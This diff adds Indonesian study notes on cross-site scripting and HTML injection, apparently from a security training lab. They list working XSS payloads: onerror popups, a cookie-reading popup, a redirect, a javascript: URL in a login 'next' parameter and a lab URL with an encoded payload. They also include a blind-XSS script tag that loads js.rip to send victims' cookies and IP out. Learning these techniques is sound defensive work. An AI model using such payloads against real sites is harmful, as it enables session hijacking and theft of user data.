@@ -1,0 +1,88 @@
+XSS (Cross Site Scripting)
+
+HTML & Javascript = Web App
+
+XSS -> Javascript
+Javascript Injection
+
+JS bisa dipakai untuk
+Mengambil cookie = session login
+Mengganti tampilan web
+dll
+
+XSS = Codingan Javascript
+
+Exploit = Senjata = XSS
+Payload = Peluru = Payload XSS
+
+"><img src=x onerror=confirm("XSS");>
+
+"><img src=x onerror=window.location="https://meta4sec.com/">
+
+http://103.176.79.76:83/lab/xss/basic-reflected/index.php?q=%22%3E%3Cimg+src%3Dx+onerror%3Dconfirm%28%22XSS%22%29%3B%3E#
+
+secure -> web tidak akan mengeksekusi javascript yg di input user
+vulnerable -> web akan mengeksekusi javascript yg di input user
+
+HARUSNYA web tidak boleh mengeksekusi kode apapun yg di input user
+web hanya boleh mengesekusi kode dalam server (bukan user)
+
+"><img src=x onerror=confirm(document.cookie);>
+<script>alert(“XSS”)</script>
+
+khusus di parameter
+javascript:alert(“XSS”)
+
+Contoh
+http://app.jason.com/auth/login?next=javascript:alert(document.cookie)
+
+app.test.com/redirect_url?=1
+app.test.com/login?=1
+
+Harusnya web cuma bisa mengeksekusi JS dari server, gaboleh dari user
+
+Parameter URL:
+?q=
+?test=
+?file=
+?account=
+?search=
+
+
+HTML Injection
+XSS gak rentan? Pake HTML Injection
+
+<h1>testing</h1>
+
+HTML hanya bisa edit tampilan web
+Javascript bisa edit tampilan web dan memunculkan popup, mencuri cookie, redirect user dll
+
+
+username: testingtesting
+
+https://web.com/?username=testingtesting
+
+
+Blind XSS
+"><script src="https://js.rip/qtnk1ptt7s"></script>  -> Javascript
+https://js.rip/qtnk1ptt7s -> Nerima Data
+
+Ketika korban akses web yang sudah di inject payload tsb, browser akan berpikir bahwa
+Javascript nyuruh browser korban untuk mengirim data cookie, ip, dll ke https://js.rip/qtnk1ptt7s 
+
+Kalo misal ketika kita paste payload xss, misal: "><img src=x onerror=confirm("XSS");>
+popup tidak ke execute
+tapi website ngereflect text yang berbeda bentuk (executed): ">
+Tandanya, rentan dengan html injection
+
+Popup tidak ke execute -> Javascript tidak tereksekusi
+Kalo text nya berubah bentuk -> HTML tereksekusi
+
+HTML Injection itu:
+ 1. Tidak bisa mencuri cookie
+ 2. Tidak bisa mengganti tampilan secara penuh
+ 3. Tidak bisa munculin popup
+ 4. Tidak bisa redirect user ke web lain
+ 5. Tidak bisa mengambil data IP, screenshot, dll
+
+HTML hanya sekedar markup, bahasa pemrograman untuk mempercantik web
